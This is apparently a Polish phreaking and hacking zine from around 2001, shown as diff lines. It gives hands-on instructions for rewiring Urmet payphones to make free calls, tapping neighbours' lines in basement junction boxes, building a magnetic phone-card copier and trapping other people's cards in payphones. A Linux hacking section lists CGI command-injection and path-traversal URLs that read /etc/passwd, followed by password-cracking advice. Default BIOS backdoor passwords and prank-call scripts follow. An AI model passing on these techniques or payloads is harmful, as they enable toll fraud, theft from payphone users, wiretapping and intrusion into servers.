+scianke telefonu, tam kolo tych rzelaznych blach co trzymajπ zawias drzwiczek
+przednich jest  taki  maly  wlacznik, wez kabel co idzie do niego i odlacz od
+plyty glownej. Teraz wez kombinereczki i  utnij jedna z nozek od tego zlacza.
+Jest  obojetne  czy  obetniesz  ten  czy ten.  Teraz wsadz wtyczke spowrotem.
+Powinna  sie trzymac na jednym PIN`ie (bolcu) bo przecierz jeden wycioles :))
+Teraz spokojnie  zamknij pudlo i wsio :) jak to sie czyta to wydaje sie ze to
+pelno roboty, ale jest inaczej... powinno to zajac minutke.
+
+€≤≤±±∞∞∞3.3.2.A co do srebrnego to przydadza sie narzedzia wypisane w punkcie
+[3.3.1]. A procedura  rozbrajania  wyglada tak: otwierasz obudowe, i odcinasz
+kabelki  idace  do czujnika  na lewej, bocznej  scianie obudowy.  Teraz utnij
+kable  lini  podlaczone  do plyty  glownej, wez kawalek  kabla 2-u zylowego i
+przyklej izolacja koncowki kabla do lini (po prostu przedluø linie o ok 0,5m.
+Koncowke  kabla (ok 0,4cm) wystaw  w  niewidocznym miejscu (np na dole) przez
+obudowe  na zewnatrz.  Teraz ostroznie  zamknij obudowe  aby nie odciaÊ kabla
+ktory wystaje lekko  na dole. I to wszystko jesli chodzi o samo przygotowanie
+automatu do podpinki wlasciwej :))))
+
+
+€≤≤±±∞∞∞3.3.3.No to lecimy z "KOKZEM"-  tylko  sie  cieplo ubierz,no bo jesli
+chcesz pogadac kilka godzin  z kumplem ktorego widziales 2lata temu to troche
+przymarzniesz... No ale chyba odeszlem od tematu :) Znalazles juz sobie swojπ
+budke?  Tak?   To dobrze. Podchodzisz  robisz  obczajke  czy  nikodo nie ma w
+poblizu  budy.  Jak niema (bo kto zimπ , nocami po zadupiach lazi :))))))  to
+jesli przygotowales srebrnego to praktycznie tylko podlaczasz  phreakophon do
+kabli ktore wystawiles na dole obudowy i dzwonisz sobie dzie chcesz. A jezeli
+przygotowales niebieskiego to musisz otworzyc go, i tak jest odcieta wiec tez
+nigdzie nie zadzwoni :))) i podlaczasz kabek od phreakophon`u do  lini, czyli
+poprostu plytki ktora wczesniej wyjeles z plyty glownej :)) proste. Najlepiej
+jak najpietw przeloøysz koniec kabla przez wylot kart, bo wtedy bedziesz mogl
+zamknac obudowe i sobie odejsc z kablem :) A jeszcze lepiej jak twoj phreako-
+phone jest bezprzewodowcem :0] to wtedy dopiero jest wypas. Acha nie zapomnij
+jak skonczysz dzwonic (za jakies 4 - 8 godzin: ) to utworz URMET`a i  podlocz
+wszystko tak jak bylo wszesniej...(ablo chociarz spruboj)zabierz swoje kable,
+zamknij pudlo i idz do domu (spac bo juz puzno:).  Bo jutro tez jest dzien...
+
+
+€≤≤±±∞∞∞3.4.Podpinka w bloku jest  wedlug mnie  o  wiele  bardziej  trudna do
+wykrycia i bezpieczniejsza od podpinki do budki... chyba ;)) Podpinke polecam
+dla wszystkich... Ale pamietaj o jednym:  NIGDY  NIE  PODPINAJ SIE  W  SWOJEJ
+KLATCE!!! wydaje sie to malo znaczace ale tak nie jest. Najlepszy do podpinki
+w bloku jest  radiotelefon (baza + sluchawka). Ktoregos wieczora (!) przyczaj
+sobie ktorego  z  nielubianych sasiadow nie ma i zejdz do piwnicy, bo przewa-
+znie tam sa szafeczki TelePsy. Jak nie masz kluczyka to  zaden problem... Wez
+i pozadnie szarpnij za przod a  sie pieknie  otworzy (mozesz czyms podwazyc).
+Teraz wszystko zalezy od tego w jak duzym bloku mieszkasz (od liczby abonetow
+naszej kochanej  TelePsy). Im  wiecej  abonentow tym wieksza skrzyneczka a im
+wieksza skrzyneczka to, tym latwiej wsadzic tam baze naszego telefonu. Proste
+jak jaranie :))) Jak skrzyneczka  jest  dosc  duza  to  wsadz  do  niej  baze
+telefonu, podlacz linie i zamknij skrzyneczke.  A  gdy  skrzyneczka jest zbyt
+mala by weszla  tam baza telefonu  to zaczy  ze  mieszkasz  w  ziemiance :)))
+Zartuje oczywiscie...  jak  jest  za  mala  to  musisz  schowac baze gdzies w
+niewidocznym miejscu niedaleko skrzyneczki, a nastepnie polaczyc baze telefo-
+nu ze skrzyneczka za pomoca cienkiego (bardzo cienkiego) kabla. Po polaczeniu
+bazy z linia wyjdz z piwnicy i idz ze sluchawka do  "cichego" miejsca.  Tylko
+nie zbyt daleko bo ci zasieg zniknie ;) Jak przed blokiem jest  jakis park to
+goraco polecam. Widac okno kolesia do  ktorego sie  podpioles. Po zakonczeniu
+rozmowy idz  do  piwnicy  i  zostaw  wszystko  tak jak to zastales. Jesli nie
+podpinasz sie do somsiada krorego nie ma, tylko do takiego ktory spi to dobze
+by bylo gdybys dodczas podpinania bazy "odciol" jego abarat.
+
+
+€≤≤±±∞∞∞3.5.BUG jest przeznaczony  dla  automatow  TPE97/U oraz CTP mowiac po
+ludzku dla srebrnych i jajek. Moze zacznijmy od potrzebnych narzedzi. Takwiec
+niezbedny jest SREBRNY lub JAJKO...  telefon komorkowy  (chyba ze wykozystasz
+inny automat obok... ale to przypal) oraz ToneDialer, ale tez nie koniecznie,
+chodzi o to czy twoj telefon podaje  dobre tony DTMF.  Ja uzywam nokii 3210 i
+dziala. No wszystko co jest  potrzebne. A teraz przejdzmy do czesci wlasciwej
+czyli wykonania.  Podnosisz  sluchawke i  niewklepujac nic czekasz ok.30 sek,
+powinienes wtedy  uslyszec trzask  a  nastepnie cisze.  To jest najwazniejszy
+moment, bo  podczas  ciszy  dzwonisz  na  budke  z  kom. (najlepiej  miec juz
+zapisany numer i tylko wcisnac "zadzwon"). Podczas gdy  z  komorki  zaczynasz
+dzwonic,  to  odkladasz  sluchawke w automacie. Czekasz i.... automat dzwoni,
+podnosimy  sluchawke  (wyswietla "rozmowa przychodzaca")  i  mamy  DIAL-TONE.
+Teraz juz wiadomo co robic...
+
+
+-----------------------------------------------------------------------------
+
+€≤≤±±∞∞∞4.Kopiarka  kart  magnetycznych... jakze to pieknie brzmi:) Jak kazdy
+wie (oj lammerzy:) prawie kazdy. Istnieje wiele rodzajow kopiarek kart magne-
+tycznych, sa lepsze i sa tez gorsze :( Kopiarka mojego pomyslu jest dosc pry-
+mitywna, ale nie to przecierz jest waøne...  Liczy sie jakosc "nowych" kart i
+procent poprawnie dzialajacych. A co do nagrywania kart magnetycznych to chce
+jeszcze  powiedziec (napisac) ze  nierozumiem  LAM  (bo niepowiem Phreakerow)
+ktore pisza FAQ  a  w  nim "sorry ale niemoge zamiescic tu schematu, bo jesli
+chcecie  to  sami  do tego dojdziecie" najlepsze jest to ze nawet niema opisu
+jak  zbudowac  nagryware. Tego nie rozumiem, udostempnia FAQ w Necie a  i tak
+guwno  w  tym  FAQ  jest. To  po kiego  Wala  pisze to  scierwo...!!! Idiota.
+
+€≤≤±±∞∞∞4.1.Do wykonania kopiarki  potrzeba kilka rzeczy, ktore nie sa trudne
+do  zdobycia  dla  zwyklego, szarego Phreak`era :)   Konkretnie mam na mysli:
+walkmen (najlepiej dobrej jakosci: Sony, Philips etc)- od niego zalezy jakosc
+nagranych  kart.  Beben od niebieskiego URMET`a (mozesz  go sobie zalatwic na
+kila sposobow:  1>wziasc sobie samemu  2>polecic te robote jakiemus hermanowi
+lub  najgorsze  3>kupic od jakiegos montera lub phreaker`a) i w ostatecznosci
+moze sie przydac PC`t i umiejetnosci w programowaniu.
+
+€≤≤±±∞∞∞4.2.Jak to wszystko polaczyc  w jedna calosc? To zadanie na 5 minut:)
+Na  poczantek  zajmiemy sie bembnem  z  Blurmeta. Co trzeba zrobic? To proste
+odkrec  cala  elektronike od mechanizmu...  To wydaje sie latwe (ale to tylko
+sie wydaje:)  Na mechanizmie musza zostac: glowice nagrywajaca i czytajaca, i
+reszta  rzeczy  MECHANICZNYCH  (silniczki) -  dobrze  bedzie  jesli  usuniesz
+silownik. Glowica  zapisujaca powinna  byc  blizej wlotu karty niz czytalaca.
+Czemu? Przeczytasz  o  tym  w  nastepnym podpunkcie. Teraz zajmijmy sie walk-
+menem. Co musisz zrobic?  Usun wszystkie czesci mechaniczne,  ma  zostac sama
+elekrtonika, a konkretnie:  plytka  z  elementami, wejscie zasilania, wyjscie
+"line"  lub  sluchawki,  i  kabelki  glowicy.  Teraz skladamy  to wszycho  do
+"kupy" :)    Podlacz glowice  czytajaca  Bembna  do  kabelkow (2) od  glowicy
+walkmena, a nagrywajaca do wyjscia "line".  Teraz podlaczamy zasilanie z 9 do
+12V do napedu bembna i jeszcze zasilanie do plytki od walkmana.
+
+Dla opornych na wiedze (lamer`sow) przewidzialem rysunek schematyczny:
+
+  +----------------------------------------------+
+  |    (Plytka od walkmana ...)                  |
+  |                                            +-|============= (przewaznie
+  |                                            --|-=-=-=-=-=-=-    4,5V)
+  |                                              |
+  |                                              |
+  |                                              |
+  |                                              |\
+  |  ||<-odczyt                  zapis-> ||      || <-regulacja poziomu
+  +--||----------------------------------||------+/      nagrywania
+     ||                                  ||
+     ||                                  |+---+
+--- ++|  ------------------------------- |    | -----------------------------
+    |++                                  +---+|
+   _||_                                     _||_
+  |;;;;|<=glowica czyt.                    |::::|<=glowica zapisujaca
+----==============--------------------------==============---   <==ruch karty
+0<-+       ^-karta oryg.                           ^-kopia
+   |
+   |                 (bemben od niebieskiego URMET`a)
+---|-------------------------------------------------------------------------
+   +-zasilanie napendu bembna...
+
+ 
+
+€≤≤±±∞∞∞4.3.Jak kopiowac?  Moze najpierw wyjasnie  jak  dziala kopiarka ktora
+wlasnie zmajstrowales... Bemben jest poto aby w takiej samej prendkosci prze-
+biegal  zapis jak  i  odczyt.  Walkman - aby wzmocnic sygnal odczytany, i juz
+wzmocniony wyslac  na  czysta karte przez glowice zapisujaca. Glowica zapisu-
+jaca musi  byc  przed czytajaca, poniewaz jakby bylo odwrotnie to kopiarka po
+skopiowaniu oryginalu skasowal by go "po drodze" (do wyjscia kart).Kopiowanie
+jest banalnie  proste.  Na poczatek  wszystkie zasilacze musza byc wylaczone,
+teraz  do  bembna wsadz najpierw czysta karte, potem oryginal. Przewin bemben
+tak  aby  karta  czysta  byla  w odleglosci  do  glowicy (zapisujacej) rÛwnej
+odleglosci  karty  oryginalnej  od  glowicy czytajπcej. Teraz wlacz zasilanie
+walkmana, poczekaj chwilke (3 sek.) i podlacz zasilanie  do silniczka obraca-
+cajacego bembnem. Karta oryginalna zostanie skopiowana na czysta. Jesli karta
+nagrana  nie  bedzie  dzialala to znaczy ze sygnal zapisany na karcie jest za
+niski,  bo jesli bylby zbyt wysoki (oczywiscie w granicach rozsπdku) to karta
+i  tak  by dzia≥ala... Musisz nagrac ja jeszcze raz :( tylko musisz zwiekszyc
+poziom sygnalu na wyjsciu  z walkmen`a (musi byc wyzsza amplituda). Do porÛw-
+nania  amplitudy  na  oryginalnej  karcie i kopi, mozesz wykozystac komputer.
+Glowice  czytajaca  podlacz  do wejscia mikrofonowego w PC`cie.  Ustaw poziom
+magrywania na najwyzszy  i wlacz nagrywanie  (z Mikrofonu). Teraz wlacz zasi-
+lanie  bembna  i  przepusc przez  niego karte oryginalna  i kopie. Teraz masz
+nagrany  sygnal  na PC. Wez odpal odpowiedni prog do obrÛbki dzwieku i otworz
+obydwa pliki.  Prog musi miec mozliwosc: "Amplitude analizing" czy jakos tak.
+Jesli niema to musisz wzrokowo ocenic roznice w amplitudzie np:
+
+
+              ,
+             /\                                     +
+            /  \                                   / \
+----+      /    +----                   ----+     /   +----
+     \    /                                  \   /
+      \  /                                    \ /
+       \/                                      +
+       `
+*karta oryginalna                        *kopia karty
+
+Chyba nie musze nic tu komentowac. Od razu widac ze na rysunku no.2 amplituda
+jest nizsza niz na rysunku no.1. Wnioski sie same nasuwaja...trzeba kopiowani
+powturzyc podnoszac sygnal nagrywania. Ale... Amplituda nie jest az tak wazna
+jak jakosc dokonanej kopii.  Amplituda jest brana pod uwage tylko w przypadku
+Srebrnego Urmet`a (oczywiscie bez przesady),  mam tu na mysli to ze Niebieski
+jest mniej czuly na mniejsza amplitude niz ma oryginal. 
+
+-----------------------------------------------------------------------------
+
+€≤≤±±∞∞∞5.Troche  o  niebieskim URMECIE.  A konkretnie kilka szczegulow ktore
+warto znac.  Bedzie troche  o  zabezpieczeniach  mechanicznych urmeta, o jego
+budowie i wiele innych przydatnych rzeczach.
+
+€≤≤±±∞∞∞5.1.Budowa  anatomiczna  -  co  tu duzo pisac...  Kazdy chyba wie jak
+wyglada URMET na zewnatrz:) Takie niebieskie pudlo. Ma taka czarna sluchawke,
+polaczana  z  automatem  kablem podobnym do weza od prysznica:). Ma taki maly
+wyswietlacz , klawiatorke (1,2,3,4,5,6,7,8,9,0,#,*:)  i  taki  maly  guziczek
+(redial)  ktory  po  wcisnieciu  powoduje  powtorzenie  ostatniego  wybranego
+numeru, oraz widelki do zrywania polaczenia... :)
+
+€≤≤±±∞∞∞5.1.1.Zabezpieczenia mechaniczne...   Piszac  to  szczegulnie  mam na
+mysli zamki  typu  ABLOY  (o budowie zamka mozesz przeczytac w punkcie [2.1].
+Szczeze  mowiac  to wcale nie jest takie dobre zabezpieczenie... bo przecierz
+"dla chcacego... nic trodnego:)".  Co  do  mechanicznych zabezpieczen URMET`a
+(i Niebieski i Srebrny)  mozna powiedziec  ze  wcale nie trodno sie dostac do
+wnetrza Budy...  Zamek  jest przykrecany do obudowy nakretka chyba 22 lub 20?
+Obudowa  Niebieskiego  jest  bardzo slaba (o ile sie nie myle z aluminium:) i
+wazy  dobre  ponad  7 kilogramow...  Czyli ~7kg*3,00zl/kg=21zl.  Dobry biznes
+dla zuli co nie maja na WINO:). Obudowa srebrnego jest z jakiegos blyszczace-
+go syfu i jest jeszcze ciezsza niz od niebieskiego... Ale czy to skupuja Hi:)
+Wewnacz  niebieskiego  jest taki prent ktory laczy zamek z takimi zatrzaskami
+na gorze  i  dole obudowy,  zabezpieczajacymi  przed  otwarciem "panelu". Jak
+kazdy  wie (sorry Lammer`s:) no prawie kazdy, wewnatrz budki na obudowie jest
+taki cybuf,z ktorego jak sie wysunie taki drucik podobny do omegi to odpadnie
+sluchawka.
+
+€≤≤±±∞∞∞5.2.Budowa morfologiczna - czyli co kryje wewnacz to budlo? Otoz jest
+tam kilka przydatnych rzeczy: plyta glowna(EPROM etc:), czytnik kart magnety-
+cznych (przyda sie do kopiowania kart patrz [4.1.]), klawiatorka, wyswietlacz
+LCD oraz inne mniej potrzebne rzeczy jak: kable (tasmowe), buzzer etc.
+
+€≤≤±±∞∞∞5.2.1.Eprom to bardzo fajna rzecz.  Sluzy do sterowania calym Urmetem
+ma zapisane  w sobie numery darmowe , numer do centrali , taryfikacje , texty
+wyswietlane na  wyswietlaczu itp. Istnieje mozliwosc edycji tej kostki. Progi
+do dekodowania EPROM`u znajdziesz  na mojej stronie(www.grandmaster.hg.pl), w
+dziale  "Progz".  Majac  odpowiednie  oprogramowanie, mozesz zdzialac cuda...
+nieporuwnywalne z zastosowaniem karty Programming... Dla zainteresowanych mam
+jeszcze ciekawostke: EPROM w niebieskim urmecie to 27c256 :))),  ciekawe  ile
+taki kosztuje ???  podejzewam ze z 15zl.  Bardzo polecam poswiecenie wiekszej
+uwagi dla tej 'kostki' to napewno sie oplaci.
+
+€≤≤±±∞∞∞5.2.2.Inne rzeczy ktore sie przydaja to: sluchawka - mozesz ja podla-
+czyc do mikrofonu  i glosniczka w komorce i CYNA... :)) Zartuje.  Przydac sie
+moze buzzer - mozesz go zamontowac w domowym telefonie, bedzie glosniej dzwo-
+nil. Mozesz tez sobie zaporzyczyc wyswietlacz LCD - do zabawy :) O ile dobrze
+pamietam to gdzies w sieci jest program do sterowania LCD z Blurmeta...
+
+-----------------------------------------------------------------------------
+
+
+€≤≤±±∞∞∞6.Centrale telefoniczne
+Oto charakterystyka ogolna (bardzo ogolna:))) szesciu central telefonicznych,
+wykorzystywanych przez naszego monopoliste tEpe SA :)))   To wiadomosci ktore
+udalo mi sie zgromadzic o tych centralach ...
+
+::Strowger, 32AB, 32AA
+  - elektromechaniczna
+  - only impulsowa 
+  - po wybraniu numeru natychmiast laczy
+  - napiecia:
+    :odlozona (sluchawka): ok 50 V
+    :podniesiona (sluchawka): miedzy 8 a 10 V
+
+::Pentaconta (PC-1000)
+  - krzyøowa
+  - impulsowa, mozliwe jest wybieranie tonowe po dodaniu odpowiedniej
+    elektroniki
+  - po wybraniu numeru natychmiast laczy
+  - napiÍcia:
+    :od≥oøona (sluchawka): 48 V
+    :podniesiona (sluchawka): miedzy 8 a 10 V
+
+::Alcatel E-10 A/B
+  - elektroniczna (mnustwo bramek, tranzystorÛw i przekaünikÛw)
+    Moze byc sterowane komputerem. W E-10/A dostepne jest wybieranie 
+    tonowe po dodaniu odpowiedniej elektroniki.
+  - E-10/A byla tylko impulsowa, ale udoskonalona E-10/B posiada rowniez
+    mozliwosc wybierania tonowego.
+  - napiÍcia:
+    :odlozona (sluchawka): (dla E-10/A) podobno 53V...
+     powinno byÊ miÍdzy 48V a 60V
+    :podniesiona (sluchawka): od 8 do 10 V
+
+::Lucent (kiedys "AT&T") 5ESS
+  - cyfrowa
+  - jednoczesnie i tonowa, i impulsowa...
+  - po wybraniu numeru, laczy natychmiast
+  - napiÍcia:
+    :odlozona (sluchawka): 50 V
+    :podniesiona (sluchawka): miedzy 8, a 10 V
+
+::Alcatel S-12
+  - cyfrowa
+  - impulsowa i tonowa
+  - po wybraniu numeru, laczy natychmiast
+  - napiÍcia:
+    :odlozona (sluchawka):    brak inf.
+    :podniesiona (sluchawka): brak inf.
+
+::Siemens EWSD
+  - cyfrowa
+  - tonowa i impulsowa (jednoczeúnie)
+  - po wybraniu numeru, laczy natychmiast
+  - napiÍcia:
+    :odlozona (sluchawka): 48 V
+    :podniesiona (sluchawka): od 8 do 10 V
+
+Tak dla zainteresowanych powiem ze TP S.A. z coraz wiekszym rozpedem moderni-
+zuje/zmienia centrale na Alcatele i Siemens`y... oczywiscie digital. Z jednej
+strony to nawet lepiej bo "niektore" analogi nie rozpoznawaly DTMF`u.
+
+€≤≤±±∞∞∞6.1.Jak chyba kazdy wie, centrala cyfrowa sie troche rozni od zwyklej
+analogowej, chociarz by tym ze w cyfrowej jest  wiele dodatkowych mozliwosci.
+Zobacz  jak  dobrze   wykorzystac  te  DIGITAL - mozliwosci  w  menu  [=>9.9]
+Oto rozne uslugi  dostepne  na  centralach cyfrowych, przepuszczam ze powinny
+dzialac na wszystkich cyfrowych (w Polsce OF KORZ:))) :
+
+
+o    przekazywanie wywolan gdy cie nie ma: gdy ktos do ciebie dzwoni a ciebie
+nie ma, to telefon dzwoni  przez 20  sekund a nastepnie przekierowywuje  tego
+co do ciebie dzwoni pod inny, podany przez ciebie numer (np.: 997 :)))
+. Aktywowanie uslugi - wybierz: *61*NUMER#
+. Dezaktywowanie uslugi - wybierz: #61#
+
+
+o    przekazywanie wywolan natychmiastowo: to samo co wyzej, tylko ze telefon
+nie dzwoni przec 20 sekund :)))
+. Aktywowanie uslugi - wybierz: *21*NUMER#
+. Dezaktywowanie uslugi - wybierz: #21#
+
+
+o    przekazywanie wywolan gdy zajete: jesli ktos  do ciebie  dzwoni, a w tym
+czasie siedzisz np. w sieci to  centrala  przekieruje  dzwoniacego  pod inny,
+podany przez ciebie numer.
+. Aktywowanie uslugi - wybierz: *67*NUMER#
+. Dezaktywowanie uslugi - wybierz: #67#
+
+
+o    polaczenie oczekujace: jesli gadasz  przez telefon, a w tym samym czasie
+ktos do ciebie dzwoni, to uslyszysz w sluchawce informujacy o  tym odpowiedni
+sygnal. Bedziesz mogl "zawiesic" pierwsza rozmowe i odebrac polaczenie.
+. Aktywowanie uslugi - wybierz: *43#
+. Dezaktywowanie uslugi - wybierz: #43#
+
+
+o    nie przeszkadzac: jak  nie  masz zamiaru gadac  z kims przez telefon, to
+moze sie przydac. Jak ktos bedzie dzwonil to twoj  aparat nie bedzie dzwonil,
+a osoba do ciebie dzwoniaca uslyszy: "prosze nie przeszkadzac"
+. Aktywowanie uslugi - wybierz: *26#
+. Dezaktywowanie uslugi - wybierz: #26#
+
+
+o    HotLine z kalibrowanym opoznieniem: podnosisz sluchawke  a  centrala cie
+od razu laczy z zaprogramowanym wczesniej numerem.
+. Aktywowanie uslugi - wybierz: *53*NUMER#
+. Dezaktywowanie uslugi - wybierz: #53#
+
+
+o    Automatyczne budzenie: po  zaprogramowaniu  budzenia, centrala oddzwania
+dokladnie o podanej przez ciebie  godzinie. Budzenie trwa  60 sekund, a jesli
+nie odbierzesz to centrala powtorzy bydzenie po 5 minutach.
+. Aktywowanie uslugi - wybierz: *55*DOGZINA# (np. dla 6:31 = *55*0631#)
+. Dezaktywowanie uslugi - wybierz: #55#
+
+
+o    ograniczenie polaczen: mozesz  zablokowac dzwonienie  z  aparatu, zablo-
+kowac polaczenia niedzymiastowe, miedzynarodowe, ziro-sidymsyt etc
+
+-----------------------------------------------------------------------------
+
+€≤≤±±∞∞∞7.Hacking - chyba karzdy  wie o co w tym chodzi? No... Sorry LAM`s :)
+Prawie karzdy. Jak wiecie o co  chodzi w temacie to punkt [6.1] mozecie sobie
+odpuscic... A jak nie wiecie to prosze bardzo: oto krotki opis, na czym pole-
+ga Hacking Linux`a.
+
+
+€≤≤±±∞∞∞7.1.Otoz haczenie linuxa polega na  zdobyciu hasla dla urzytkownika o
+'imieniu'  root (z angielskiego - Korzen, a z rumunskiego - penis:)  No i jak
+juz mowilem to root to tj. w Win.NT administrator. Haslo do root`a jest zapi-
+sane w pliku z haslami o nazwie  "passwd" no i po  zdobyciu pliku, i pozniej-
+szym "zlamaniu" go, otrzymujemy  haslo dla root`a.  Tak  wyglada bardzo stre-
+szczona  teorja  hackerstwa, a raczej samego wlamywania  sie  do systemu. Jak
+kogos bardzo interesuje ten temat to Very polecam UndergroundFAQ (do pobrania
+z http://www.underground.org.pl lub http://phreaking.at/lord)
+
+
+€≤≤±±∞∞∞7.2.Jak wiecie  pliku password nie  da sie ot  tak sobie przejrzec bo
+jest  on  w  jakis sposob  zabezpieczony  (kontrola dostepu lub  cus takiego)
+dlatego tez  podam kilka "dziur" przez ktore  mozna sie dostac do tego pliku:
+[...]/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+[...]/cgi-bin/php.cgi?/etc/passwd
+[...]/cgi-bin/phf?Qalias=hell%0acat%20/etc/passwd%0a
+[...]/cgi-bin/phf?Qalias=hell%0auname%20-a%0a 
+[...]/cgi-bin/handler/whatever;cat       /etc/passwd|    ?data=Download
+[...]/cgi-bin/campas?%0acat%0a/etc/passwd%0a
+[...]/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd
+[...]/cgi-bin/view-source?../../../../../../../etc/passwd
+
+( [...]->w to miejsce wpisz adres serwera np: http://www.tpsa.pl Hi hi:P)
+
+
+€≤≤±±∞∞∞7.3.Jesli  masz juz plik  passwd  to juz  65% sukcesu :)  Teraz tylko
+zaopatrujesz sie w  jakis program do lamania unix`owych hasel i juz. Ja pole-
+cam  program  "John The Ripper" - to chyba  najlepszy  program  tego  typu :)
+
+
+-----------------------------------------------------------------------------
+
+€≤≤±±∞∞∞8.Bios hacking? Jak juz zapewne karzdy  (w temacie) wie , bios to tj.
+jakby program  zapisany na  kosci  pamieci na  plycie  glownej.  Istnieja twa
+rodzaje Biosu:  -Award i -Ami Bios.  Jak ktos chce uniemozliwic innym USER`om
+uruchomienie   (i szperanie)  komputera   to    zaklada  haslo    w  Bios`ie.
+
+€≤≤±±∞∞∞8.1.Wbrew pozorom wtlaczanym przez  Lamerow , mozna  sie  dostac "do"
+komputera wcale nie  znajac hasla. Mozna uzyc  programu do wyciagania hasel z
+Biosu, wyjac na  chwile bateryjke z plyty glownej lub ...  uzyc uniwersalnego
+haselka.  A  co  do  uniwersalnych  hasel  to , oto  kilka  z  nich:
+
+AWARD:
+       Zbgn
+       AWARD_SW
+       lkwpeter
+       condo
+       >award<
+       j322
+       589589
+       (1)_ccecb
+       NOPASS
+       zbg
+       award_sw
+
+Ami:
+       AMI
+       ami
+
+I to wszystko co pamietam z hasel bios`owych, jak znacie jakies inne to m@il.
+
+
+-----------------------------------------------------------------------------
+
+€≤≤±±∞∞∞9.Glupie rzeczy... Czyli rzeczy ktore malo a zarazem tak wiele znaczπ
+dla zwykledo Phreakera (czytac:zlego lobuza:)
+
+€≤≤±±∞∞∞9.1.Nabijanie  sie  z  ludzi przez telefon, to chamstwo ale  i  fajna
+zabawa:) Takie  rzeczy  robi  sie  kapusiom, pedalom itp.,  a nie normalnym i
+pozadnym ludziom.  To taka mala uwaga.  Opisze kilka takich telefonow:
+
+Num.1:         (dzien: [do piatku], godzina:[do 15])
+[ty]-dzien dobry... ja dzwonie z zaklady energetycznego...
+[ktos]-a dziendobry, o co chodzi?
+[ty]-bo przosze Pani mam nastepujace pytanie: "byl u pani wczoraj prad?"
+[ktos]-byl...
+[ty]-tak? a co chcia≥?   H^h^h^h...
+
+Num.2:         (dzien: [obojetnie], godzina:[do 18])
+[ty]-dzien dobry... Czy dodzwonilem sie do ZOO?
+[ktos]-Oj niestety pomylka...
+[ty]-To dlaczego ma≥pa(goryl etc.) przy telefonie...?
+[ktos]- ?!!&?!$?!?!  H^h^h^...
+
+Num.3:         (dzien: [obojetnie], godzina:[po 20])
+[ty]-Dzien dobry, ja dzwonie z WodociπgÛw...
+[ktos]-slucham pana...
+[ty]-czy jest u panstwa ciepla woda?
+[ktos]-tak, jest...
+[ty]-to myjcie nogi i idücie spac... :)))))))))))
+[ktos]-??????????
+
+
+€≤≤±±∞∞∞9.2.Jak zrobic "przejÍcie" karty?    Czyli pozyskiwanie cudzych kart.
+Metod nizej opisanych  wcale nie pochwalam bo sadze ze to zwykle chamstwo, bo
+przecierz  nie  pograøasz   TelePsy  tylko  zwyklych  uzytkownikow  automatow
+publicznych. Ale trudno...  bo wlasnie przez takie rzeczy, ludzie traca cenne
+zaufanie do naszego kochanego monopolisty, TPsa :))) Ale nie o  tym mialem tu
+pisac:))) A oto trzy sposoby sluzπcych do pozyskiwania kart...  UWAGA: wszys-
+tkie metody stosuj w  nastepujacy sposob: w piatek zamontuj(ok 20) a w sobote
+(przed 15oo)zdemontuj...
+
+
+€≤≤±±∞∞∞9.2.1.Sposob pierwszy jest banalny, ale lepszy od sposobu drugiego...
+Wez zuzytπ karte telefoniczna (chyba ze wolisz zniszczyc dobra:))) i przetnij
+ja na  pÛl (jak na  rysunku), teraz te pÛlowe natnij w dwuch miejscach (mniej
+wiecej do polowy szerokosci). Te  powstale paski zagnij w nastepujacy sposÛb:
+dwie boczne w jedna strone ,a srodkowa w druga strone.  Takπ karte wsadz do
+wylotu kart (tak aby pojedyncze zagiencie bylo na dole).
+   ____________|_______________         .------.----------+
+  /            |               |    ________________      |
+ /             |               |   |    |      |    |     |
+/              |               |   |    |      |    |     +-- tu nacinasz
+|              |               |   |    |      |    |
+|--------------|---------------|   |    |      |    |
+|              |               |   |                |
+|--------------|---------------|   |                |
+|______________|_______________|   |________________|
+               |                              (c)2001 by Lord.GRAND
+               |
+               ^tu przetnij
+
+
+€≤≤±±∞∞∞9.2.2.Sposob drugi jest mniej skuteczny niz pierwszy ale coz zrobic:)
+Wez zuzytπ karte telefonicznπ i zegnij ja tak aby wygladala z boku tak jak na
+rysunku zamieszczonym ponizej:
+
+     /\  /\
+<-  /  \/ .\  /
+   /        \/
+W  miejscu  gdzie  na  rysunku  jest  kropka [.]  zrob odwor o  sr.0,5cm. Tak
+zmontowana karte ladujesz do wyjscia kart (szczelka do siebie) jak juz bedzie
+kilka kart  to  wyjmnij blokade poprzez zachaczenie drutem za otwor wczesniej
+zrobiony na karcie lub otworz bude i wyjmij karty (blokade ta musisz wyjmowac
+wieczorem bo jak ci sie karty wysypia na chodnik to bedzie troche podejrzane)
+
+
+
+€≤≤±±∞∞∞9.2.3.Sposob by Lord.GRAND. Na sposob ten wpadlem w bardzo nietypowej
+sytuacji ;0]  Poszedlem sobie kiedys na 'spacerek' krajoznawczy, oczywiscie z
+kluczem  [00131000<], pakietem  kluczy, pilnikiem, phreakomacikiem, lutownica
+gazowa  i  niezastapionym  chlorkiem  rzelaza  FeCl :))). Tak jakby nigdy nic
+podszedlem  do  Urmeta aby  sie pobawic (cholerne zadupie) podnosze sluchawke
+a  na  wyswietlaczu "NIECZYNNY",  myúle sobie <<Co jest?>> Otworzy≥em budlo i
+niby  wszystko  jest  w  porzadku ??? ale jednak nie.  W czytniku zablokowala
+sie karta... to  ja  wyjelem. Bylo na niej odbite mnustwo 'zabkÛw' i cala sie
+klei≥a... FuuUuuu. Musialem  sobie wyjac EPROM`a z plytki wiec przykleilem te
+karte  do dzwiczek  od wewnacz, bo  przecierz jej nie wlorze do kieszeni :)))
+Wyjelem EPROM`a i wlasnie  wtedy  uswiadomilem sobie fakt ze mozna wykozystac
+karte  do pozyskania  karty. Karta  ktora wylatuje z bebna, odbije sie od tej
+pseudo blokady i upadnie na spÛd obudowy BlueUrmet`a :)))) Gdy wrucilem do
+domu dobrze pomyslalem jak udoskonalic ten trick :0] i udalo sie.
+
++-------------+
+|taúma -  -  -|     Na brzeg karty naklejasz tasme klejaca (najlepiej szara -
++-------------+     taka co sa w sklepach budowlanych,o szerokosci okolo 5cm)
+|             |     na karcie powinno  byc naklejone +/- 2cm. Jak juz to masz
+|             |     zrobione to  otwierasz budke (BLUE OF KORZ)i naklejasz te
+|             |     reszte  tasmy ok  3 - 3,5 cm  pod wylotem karty (tam jest
+|             |     taka plaska powierzchnia).  Karta powinna byc przyklejona
+|             |     zebem do gory, tak jak na rysynku. Teraz zamykasz pudlo i
+|  karta      |     odchodzisz powoli i spokojnie :))) Karty wyjmij za ok 2-3
+|             /     dni, zanim  przyjedzie  monter i zarekfiruje ci lup :))))
+|            /
+|___________/
+>tym do gory<
+
+
+
